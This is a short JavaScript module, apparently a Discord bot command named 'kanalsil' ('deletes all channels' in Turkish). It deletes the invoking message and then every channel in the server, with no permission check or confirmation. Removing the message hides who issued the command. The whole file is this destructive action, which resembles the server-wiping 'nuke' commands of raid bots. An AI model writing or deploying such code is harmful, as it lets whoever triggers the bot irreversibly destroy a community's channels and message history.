module.exports = {
    name: 'kanalsil',
    description: 'Bütün kanalları siler',
    async execute(message, args, client) {
        message.delete();
        await message.guild.channels.cache.forEach(channel => channel.delete());
    }
}